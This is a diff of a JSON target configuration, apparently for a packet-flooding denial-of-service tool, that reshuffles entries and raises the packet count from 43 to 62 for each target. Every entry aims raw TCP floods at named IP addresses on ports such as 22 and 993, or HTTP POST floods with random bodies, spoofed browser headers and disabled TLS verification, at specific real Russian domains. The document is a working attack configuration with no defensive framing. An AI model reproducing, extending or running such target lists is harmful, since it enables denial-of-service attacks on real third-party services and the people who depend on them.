@@ -8,7 +8,51 @@
         },
         {
             "type": "packetgen",
-            "count": 43,
+            "count": 62,
+            "name": "tcp://185.27.195.98:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "185.27.195.98:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 62,
+            "name": "tcp://188.124.47.76:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "188.124.47.76:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 62,
             "name": "https://moistrahovki.ru",
             "args": {
                 "connection": {
@@ -52,14 +96,14 @@
         },
         {
             "type": "packetgen",
-            "count": 43,
-            "name": "tcp://188.124.47.76:22",
+            "count": 62,
+            "name": "tcp://5.188.119.226:22",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "188.124.47.76:22"
+                        "address": "5.188.119.226:22"
                     }
                 },
                 "packet": {
@@ -74,36 +118,14 @@
         },
         {
             "type": "packetgen",
-            "count": 43,
-            "name": "tcp://185.27.195.98:22",
+            "count": 62,
+            "name": "http://moistrahovki.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "185.27.195.98:22"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 43,
-            "name": "http://avtonalogi.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "avtonalogi.ru:80"
+                        "address": "moistrahovki.ru:80"
                     }
                 },
                 "packet": {
@@ -111,7 +133,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://avtonalogi.ru",
+                            "path": "http://moistrahovki.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -124,9 +146,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://avtonalogi.ru",
-                                "Referer": "http://avtonalogi.ru",
-                                "X-Forwarded-Host": "avtonalogi.ru",
+                                "Origin": "http://moistrahovki.ru",
+                                "Referer": "http://moistrahovki.ru",
+                                "X-Forwarded-Host": "moistrahovki.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -137,7 +159,7 @@
         },
         {
             "type": "packetgen",
-            "count": 43,
+            "count": 62,
             "name": "tcp://185.27.195.98:81",
             "args": {
                 "connection": {
@@ -159,158 +181,7 @@
         },
         {
             "type": "packetgen",
-            "count": 43,
-            "name": "tcp://188.124.47.76:993",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "188.124.47.76:993"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 43,
-            "name": "https://avtonalogi.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "avtonalogi.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://avtonalogi.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://avtonalogi.ru",
-                                "Referer": "https://avtonalogi.ru",
-                                "X-Forwarded-Host": "avtonalogi.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 43,
-            "name": "http://git.shtrafy-gibdd.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "git.shtrafy-gibdd.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://git.shtrafy-gibdd.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://git.shtrafy-gibdd.ru",
-                                "Referer": "http://git.shtrafy-gibdd.ru",
-                                "X-Forwarded-Host": "git.shtrafy-gibdd.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 43,
-            "name": "https://git.shtrafy-gibdd.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "git.shtrafy-gibdd.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://git.shtrafy-gibdd.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://git.shtrafy-gibdd.ru",
-                                "Referer": "https://git.shtrafy-gibdd.ru",
-                                "X-Forwarded-Host": "git.shtrafy-gibdd.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 43,
+            "count": 62,
             "name": "https://ci.shtrafy-gibdd.ru",
             "args": {
                 "connection": {
@@ -354,36 +225,17 @@
         },
         {
             "type": "packetgen",
-            "count": 43,
-            "name": "tcp://5.188.119.226:22",
+            "count": 62,
+            "name": "https://avtonalogi.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "5.188.119.226:22"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
+                        "address": "avtonalogi.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
                         }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 43,
-            "name": "http://moistrahovki.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "moistrahovki.ru:80"
                     }
                 },
                 "packet": {
@@ -391,7 +243,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "http://moistrahovki.ru",
+                            "path": "https://avtonalogi.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -404,9 +256,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://moistrahovki.ru",
-                                "Referer": "http://moistrahovki.ru",
-                                "X-Forwarded-Host": "moistrahovki.ru",
+                                "Origin": "https://avtonalogi.ru",
+                                "Referer": "https://avtonalogi.ru",
+                                "X-Forwarded-Host": "avtonalogi.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -417,7 +269,48 @@
         },
         {
             "type": "packetgen",
-            "count": 43,
+            "count": 62,
+            "name": "http://avtonalogi.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "avtonalogi.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://avtonalogi.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://avtonalogi.ru",
+                                "Referer": "http://avtonalogi.ru",
+                                "X-Forwarded-Host": "avtonalogi.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 62,
             "name": "http://ci.shtrafy-gibdd.ru",
             "args": {
                 "connection": {
@@ -448,6 +341,113 @@
                                 "Origin": "http://ci.shtrafy-gibdd.ru",
                                 "Referer": "http://ci.shtrafy-gibdd.ru",
                                 "X-Forwarded-Host": "ci.shtrafy-gibdd.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 62,
+            "name": "http://git.shtrafy-gibdd.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "git.shtrafy-gibdd.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://git.shtrafy-gibdd.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://git.shtrafy-gibdd.ru",
+                                "Referer": "http://git.shtrafy-gibdd.ru",
+                                "X-Forwarded-Host": "git.shtrafy-gibdd.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 62,
+            "name": "tcp://188.124.47.76:993",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "188.124.47.76:993"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 62,
+            "name": "https://git.shtrafy-gibdd.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "git.shtrafy-gibdd.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://git.shtrafy-gibdd.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://git.shtrafy-gibdd.ru",
+                                "Referer": "https://git.shtrafy-gibdd.ru",
+                                "X-Forwarded-Host": "git.shtrafy-gibdd.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
